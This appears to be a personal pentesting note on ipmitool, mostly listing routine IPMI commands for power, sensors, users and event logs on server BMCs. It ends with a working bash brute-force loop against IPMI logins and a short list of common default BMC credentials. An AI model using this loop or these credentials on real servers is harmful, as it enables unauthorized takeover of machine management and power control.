

```bash
sudo apt install ipmitool
```
You have **IPMI access**, either:
- **Local** (via `/dev/ipmi0` if running on the target machine)
- **Remote** (via network using IPMI-over-LAN)

---

`ipmitool` is a command-line utility used to **manage and configure IPMI-enabled devices**, such as servers with **Baseboard Management Controllers (BMCs)**. 

It allows you to perform tasks like:
- Power control (on/off/reset)
- Sensor data reading (temperature, fan speed, etc.)
- User management
- Event log access

---

# Used port 

[[UDP port 623]]

---

# Common `ipmitool` Commands


## Authentication Parameters (for remote access)
When accessing IPMI over LAN (common on servers), you'll typically specify:
```bash
ipmitool -I lanplus -H <BMC_IP> -U <username> -P <password> <command>
```
- `-I lanplus`: Interface (use `lanplus` for encryption)
- `-H`: IP address of the IPMI interface (BMC)
- `-U`: Username
- `-P`: Password

## Power Control
```bash
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> power status
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> power on
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> power off
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> power reset
```

## View Sensor Data
```bash
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> sensor
```
Shows temperature, fan speed, voltages, etc.



## User Management
List users:
```bash
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> user list
```
Add or modify users requires more detailed commands (ask if you want help).

## System Event Log (SEL)
```bash
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> sel list
```
Clearing SEL:
```bash
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> sel clear
```

## FRU (Field Replaceable Unit) Info
```bash
ipmitool -I lanplus -H <BMC_IP> -U <user> -P <pass> fru
```

## Local Access Example
If you’re running `ipmitool` on the machine that has IPMI:
```bash
sudo ipmitool chassis status
sudo ipmitool sensor
```
These use the `open` interface by default and access `/dev/ipmi0`.

---

# Brut force 

```bash
#!/bin/bash
while read user; do
  while read pass; do
    echo "Trying $user:$pass"
    ipmitool -I lanplus -H <BMC_IP> -U "$user" -P "$pass" chassis status &> /dev/null
    if [ $? -eq 0 ]; then
      echo "[+] Success with $user:$pass"
      exit 0
    fi
  done < passwords.txt
done < users.txt
```

**Common credential**
```
root changeme
ADMIN Administrator
root ADMIN
```
